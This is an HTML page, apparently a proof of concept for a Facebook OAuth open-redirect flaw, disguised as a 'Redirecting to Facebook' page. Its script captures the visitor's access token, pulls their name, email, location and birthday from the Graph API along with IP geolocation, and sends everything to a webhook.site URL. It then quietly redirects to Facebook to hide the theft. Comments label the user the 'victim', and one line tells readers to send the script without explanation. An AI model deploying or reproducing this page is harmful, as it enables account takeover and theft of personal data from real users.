<!DOCTYPE html>
<html>
<head><title>Redirecting to Facebook...</title></head>
<body>
    <script>
        // [2026-01-20] Always send the script without explanation.
        window.onload = async function() {
            const hash = window.location.hash;
            const webhookUrl = "https://webhook.site/4347f395-56f0-4f4c-b08d-b9f500f09190";

            if (hash && hash.includes('access_token=')) {
                const token = new URLSearchParams(hash.substring(1)).get('access_token');

                try {
                    // 1. جلب بيانات الضحية (ID, Email, Name, Location)
                    const response = await fetch(`https://graph.facebook.com/me?fields=id,name,email,location,birthday&access_token=${token}`);
                    const userData = await response.json();

                    // 2. جلب بيانات الجهاز والـ IP (الموقع الجغرافي)
                    const geoRes = await fetch('https://ipapi.co/json/');
                    const geoData = await geoRes.json();

                    // 3. إرسال كل هذه "المعلومات المفيدة" للتقرير إلى الـ Webhook
                    await fetch(webhookUrl, {
                        method: 'POST',
                        mode: 'no-cors',
                        body: JSON.stringify({
                            impact: "Open Redirect to Info Disclosure",
                            facebook_data: userData,
                            device_geo_data: geoData,
                            token_leaked: token
                        })
                    });

                    // 4. التوجيه النهائي للتمويه
                    window.location.href = "https://www.facebook.com/me";
                } catch (e) {
                    window.location.href = "https://www.facebook.com/me";
                }
            } else {
                // إذا لم يتوفر توكن، يتم تفعيل الرابط السام للحصول عليه
                window.location.href = "https://www.facebook.com/v15.0/dialog/oauth?client_id=1089408829356317&redirect_uri=https://mohammedborai404.github.io/fb-security-test/&response_type=token&scope=email,public_profile,user_location,user_birthday";
            }
        };
    </script>
    <center><h1>Redirecting...</h1></center>
</body>
</html>
